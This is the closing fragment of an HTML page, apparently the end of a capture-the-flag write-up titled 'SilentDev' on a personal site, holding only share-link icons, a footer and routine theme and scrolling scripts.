                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on telegram"
            href="https://telegram.me/share/url?text=SilentDev%20-%20By%20me&amp;url=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share SilentDev - By me on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=SilentDev%20-%20By%20me&u=https%3a%2f%2fconper.xyz%2fwriteups%2fmedium%2fsilentdev%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://conper.xyz/">Conper</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
